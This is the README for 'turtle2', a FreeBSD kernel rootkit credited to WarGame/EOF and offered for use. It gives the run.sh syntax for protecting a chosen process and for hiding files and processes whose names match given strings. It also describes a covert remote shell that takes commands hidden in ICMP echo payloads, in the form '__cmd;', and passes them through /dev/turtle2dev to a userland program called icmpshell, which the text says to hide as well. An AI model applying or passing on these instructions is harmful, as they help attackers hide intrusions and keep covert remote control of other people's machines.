This is the turtle2 rootkit for FreeBSD developed by WarGame/EOF.
It's an improvement of the original turtle rootkit.
You can contact me at wargame89@yahoo.it for bugs notifications or anything else!

Use:
------------
./run.sh pid file pname

pid = the pid of the process to protect 
file = every file containing this string in its name will be protected
pname = every process containing this strings in its name will be hidden 

Remote shell
-------------
When turtle2 detects a icmp echo packet containing the special cmd string it 
will store it in a global buffer that can be read using the special dev /dev/turtle2dev.
This is done by the user-land program icmpshell.
The cmd must be stored in the payload of the ICMP echo packets. The format of cmd is: __cmd; .
(This program should be hidden. Set turtle2.pname=icmpshell)
